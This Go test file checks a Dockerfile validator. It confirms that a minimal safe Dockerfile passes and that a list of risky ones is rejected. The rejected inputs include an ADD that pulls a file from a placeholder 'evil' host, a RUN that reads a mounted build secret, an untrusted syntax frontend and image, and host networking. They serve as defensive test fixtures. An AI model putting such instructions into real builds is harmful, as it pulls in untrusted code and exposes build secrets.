//go:build linux

package builder

import (
	"strings"
	"testing"
)

func TestDockerfileFixturePolicy(t *testing.T) {
	if ValidateDockerfile([]byte("FROM scratch\nCOPY file /file\nUSER 1000\n")) != nil {
		t.Fatal("safe fixture")
	}
	for _, dockerfile := range []string{"#syntax=evil/frontend\nFROM scratch\n", "FROM scratch\nADD https://evil/file /file\n", "FROM scratch\nRUN --mount=type=secret,id=x cat /run/secrets/x\n", "FROM scratch\nRUN --network=host echo x\n", "FROM scratch\nCOPY --from=evil/image /file /file\n", "FROM alpine:latest\n", "FROM scratch\nFROM scratch\n", "FROM scratch\nRUN cat <<EOF\nx\nEOF\n", "FROM scratch\nRUN echo \\\nhi\n", strings.Repeat("x", 65537)} {
		if ValidateDockerfile([]byte(dockerfile)) == nil {
			t.Fatal("unsafe profile accepted")
		}
	}
}
